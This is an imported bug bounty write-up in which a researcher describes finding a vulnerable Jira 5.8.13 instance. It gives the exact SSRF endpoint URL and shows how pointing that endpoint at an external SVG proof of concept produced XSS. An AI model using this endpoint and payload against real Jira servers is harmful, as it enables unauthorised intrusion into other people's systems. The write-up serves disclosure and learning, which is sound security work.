---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-06-01_how-i-converted-ssrf-to-xss-in-jira.md
original_filename: 2018-06-01_how-i-converted-ssrf-to-xss-in-jira.md
title: How i converted SSRF to XSS in Jira.
category: documents
detected_topics:
- oauth
- ssrf
- xss
- command-injection
- api-security
tags:
- imported
- documents
- oauth
- ssrf
- xss
- command-injection
- api-security
language: en
raw_sha256: 91a55d066695d99a955708107aab9d7e4f0bb22e64a7029d8d9333c237d9e818
text_sha256: fdcc0483bc10ade3fa6a53606b0f6f45e21b65c82d09bbcf9fbf0b6e7199e636
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# How i converted SSRF to XSS in Jira.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-06-01_how-i-converted-ssrf-to-xss-in-jira.md
- Source Type: markdown
- Detected Topics: oauth, ssrf, xss, command-injection, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `91a55d066695d99a955708107aab9d7e4f0bb22e64a7029d8d9333c237d9e818`
- Text SHA256: `fdcc0483bc10ade3fa6a53606b0f6f45e21b65c82d09bbcf9fbf0b6e7199e636`


## Content

---
title: "How i converted SSRF to XSS in Jira."
page_title: "How i converted SSRF TO XSS in jira. | by Ashish Kunwar | Medium"
url: "https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158"
authors: ["Ashish Kunwar (@D0rkerDevil)"]
bugs: ["SSRF", "XSS"]
bounty: "50"
publication_date: "2018-06-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5858
scraped_via: "browseros"
---

# How i converted SSRF to XSS in Jira.

Top highlight

How i converted SSRF TO XSS in jira.
Ashish Kunwar
Follow
2 min read
·
Jun 1, 2018

236

3

I m very much into Bug Bounty and i spend my whole day doing this finding new and interesting stuff and kept on upgrading my recon techniques.

So this Site was random and has vast subdomains to test

domain *.example.com

so i used some sites to find subdomains

FindSubdomains.com

2. DnsDumpster

3. virustotal

4. Acunetix mannual tool

Before i start Acunetix does Subdomain scans so just set the time out to 20 and you will get a really big list with banners and response headers. (it does the half of the work for you.)

Now, i been through lots of subdomains and i was specifically looking for any jira environment , and i found one.

lets say wiki.example.com

so i looked at the version and it was “5.8.13” ,which is affected to ssrf ……

I remember the “Alyssa Herrera” writeup on “Piercing the Veil: Server Side Request Forgery to NIPRNet access”

so i quickly visited

“plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com”

Get Ashish Kunwar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

And Boom i got the google page and i m like

Hell Yea !

So i followed the writeup but couldn’t managed to get any sensitive info .

[Yes i tried everything ..nothing worked.]

And that’s where i was like “why god?” why ?

why God?

and then suddenly it came to my mind and i went to brute xss blog

copied “http://brutelogic.com.br/poc.svg” , and put it place of https://google.com

and boom , i got XSS

Press enter or click to view image in full size
ssrf to XSS in #Vain

So it worked and i got bounty of 50$ which is less (and that company sucks)

Anyways it doesn’t matter at all , it was all about exploration and learning new things and gain experience.

#sharing is #caring

Hope you guys enjoyed it and learned something new. #[For who doesn’t know ,rest are leets].

Thank you

./Logout

follow me on twitter: 
Ashish Kunwar

and if you have any questions DM is open only for followers.
